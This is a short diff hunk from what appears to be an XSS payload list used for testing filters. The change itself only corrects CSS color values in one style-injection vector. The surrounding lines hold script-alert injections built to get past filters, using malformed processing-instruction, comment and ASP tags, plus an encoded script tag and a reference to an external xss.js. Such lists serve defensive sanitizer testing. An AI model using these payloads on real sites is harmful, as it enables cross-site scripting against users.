@@ -270,8 +270,8 @@ PT SRC="http://ha.ckers.org/xss.js">
 <? foo="><x foo='?><script>alert(1)</script>'>">
 <! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
 <% foo><x foo="%><script>alert(123)</script>">
-<div style="font-family:'foo&#10;;color:yello;';">LOL
-LOL<style>*{/*all*/color/*all*/:/*all*/green/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+<div style="font-family:'foo&#10;;color:yellow;';">LOL
+LOL<style>*{/*all*/color/*all*/:/*all*/yellow/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
 <script>({0:#0=alert/#0#/#0#(0)})</script>
 
 &lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
